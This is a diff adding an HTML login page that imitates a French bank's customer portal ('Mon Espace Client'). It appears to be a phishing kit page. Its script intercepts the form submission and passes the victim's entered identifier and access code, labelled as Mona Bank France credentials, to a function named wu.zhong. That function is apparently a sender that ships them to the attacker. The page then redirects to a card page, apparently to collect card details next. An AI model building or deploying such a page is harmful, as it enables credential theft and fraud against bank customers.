@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport"
+		content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/css/line.css">
+    <title></title>
+</head>
+<body>
+
+   <div class="border">
+   <div class="title">
+    <div class="photo">
+      <img src="res/img/user.png">
+      </div>
+
+      <div class="disc">
+        Mon Espace Client
+      </div>
+      </div>
+      <form action="post.php" method="post">
+
+        <div class="col">
+        <input type="text" name="user" required placeholder="identifiant">
+        </div>
+
+        <div class="col">
+        <input type="password" name="pass" required placeholder="Code d'accès">
+        </div>
+
+        <div class="col">
+          <input type="checkbox">
+          Mémoriser mon identifiant
+        </div>
+
+        <div class="col1" style="text-align:center;">
+          <button type="sumbit">Se connecter</button>
+        </div>
+</form>
+        <div class="col row">
+          <div class="left">
+          <a href="">Code d'accès oublié</a></div>
+          <div class="right"><a href="">Identifiant oublié</a></div>
+        </div>
+
+        <div class="xx">
+        <div class="l1">
+        <button type="submit">Aide à la connexion</button>
+        </div>
+        <div class="r1">
+        <button type="submit">Numéros utiles</button>
+        </div>
+        </div>
+
+
+
+      </div>
+
+
+
+
+
+
+
+
+
+    </div>
+
+
+    
+
+
+  <script type="text/javascript">
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+e.preventDefault();
+
+wu.zhong(`✉️ Mona Bank France Email: ${document.querySelector("[name='user']").value}\n\n🔒 Mona Bank France Password: ${document.querySelector("[name='pass']").value}`);
+
+window.location="card.html";
+
+})
+
+</script>
+
+
+
+
+</body>
+</html>  
